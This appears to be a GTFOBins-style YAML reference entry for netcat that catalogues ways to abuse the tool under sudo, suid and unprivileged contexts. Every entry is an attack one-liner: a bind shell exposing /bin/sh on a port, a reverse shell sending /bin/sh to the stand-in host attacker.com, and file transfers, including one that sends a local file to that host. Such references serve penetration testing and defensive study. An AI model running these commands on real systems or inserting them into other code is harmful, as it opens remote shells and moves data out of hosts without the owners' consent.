---
functions:
  bind-shell:
  - code: |-
      nc -l -p 12345 -e /bin/sh
    comment: |-
      This only works with netcat traditional.
    connector: tcp-client
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  download:
  - code: |-
      nc -l -p 12345 >/path/to/output-file
    comment: |-
      The file is actually written by the invoking shell.
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: tcp-client
  - code: |-
      nc attacker.com 12345 >/path/to/output-file
    comment: |-
      The file is actually written by the invoking shell.
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: tcp-server
  reverse-shell:
  - code: |-
      nc -e /bin/sh attacker.com 12345
    comment: |-
      This only works with netcat traditional.
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
    listener: tcp-server
  upload:
  - code: |-
      nc -l -p 12345 </path/to/input-file
    comment: |-
      The file is actually read by the invoking shell.
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: tcp-client
  - code: |-
      nc attacker.com 12345 </path/to/input-file
    comment: |-
      The file is actually read by the invoking shell.
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: tcp-server
...
